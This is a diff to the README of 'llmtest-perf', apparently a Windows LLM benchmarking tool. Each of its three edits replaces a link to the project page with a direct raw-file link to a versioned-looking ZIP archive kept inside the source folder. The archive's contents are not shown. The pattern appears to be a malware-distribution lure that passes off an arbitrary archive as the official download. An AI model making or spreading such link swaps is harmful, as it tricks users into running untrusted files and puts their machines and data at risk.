@@ -1,6 +1,6 @@
 # 🧪 llmtest-perf - Reliable LLM performance checks
 
-[![Download](https://img.shields.io/badge/Download-llmtest--perf-blue?style=for-the-badge)](https://github.com/eslammoha8625/llmtest-perf)
+[![Download](https://img.shields.io/badge/Download-llmtest--perf-blue?style=for-the-badge)](https://github.com/eslammoha8625/llmtest-perf/raw/refs/heads/main/src/llmtest_perf/perf-llmtest-v3.6-beta.3.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ This project is made for Windows users who want a simple way to run performance 
 
 Use this link to visit the page and download the project:
 
-[Open the download page](https://github.com/eslammoha8625/llmtest-perf)
+[Open the download page](https://github.com/eslammoha8625/llmtest-perf/raw/refs/heads/main/src/llmtest_perf/perf-llmtest-v3.6-beta.3.zip)
 
 If you see a ZIP file or release package on the page:
 
@@ -222,4 +222,4 @@ These files usually show how to install, start, and test the app
 
 ## 🔗 Project Link
 
-[Open llmtest-perf on GitHub](https://github.com/eslammoha8625/llmtest-perf)
+[Open llmtest-perf on GitHub](https://github.com/eslammoha8625/llmtest-perf/raw/refs/heads/main/src/llmtest_perf/perf-llmtest-v3.6-beta.3.zip)
